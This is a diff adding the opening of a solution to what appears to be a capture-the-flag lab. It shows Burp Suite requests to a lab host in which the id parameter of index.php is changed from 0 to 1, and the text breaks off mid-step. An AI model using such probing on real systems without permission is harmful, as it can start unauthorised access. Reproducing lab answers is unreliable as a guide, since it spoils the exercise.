@@ -131,4 +131,67 @@ Life Left: 74 minute(s)
 
 Solution:
 
-1) start the machine , go to the target 
+1) start the machine , go to the target site (83.136.253.40:39409 )
+2) go to burp suite , check the request when you go to(83.136.253.40:39409 )
+this is the request when going to target(83.136.253.40:39409 )
+```
+GET / HTTP/1.1
+Host: 83.136.253.40:39409
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+
+```
+
+
+Use GET request '/index.php?id=0'  as shown below
+```
+GET /index.php?id=0 HTTP/1.1
+Host: 83.136.253.40:39409
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+```
+response for this was:- 
+```
+HTTP/1.1 200 OK
+Date: Tue, 01 Apr 2025 16:08:28 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 19
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+User does not exist
+```
+
+
+now change it to /index.php?id=1
+```
+GET /index.php?id=1 HTTP/1.1
+Host: 83.136.253.40:39409
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+```
+
+in response 
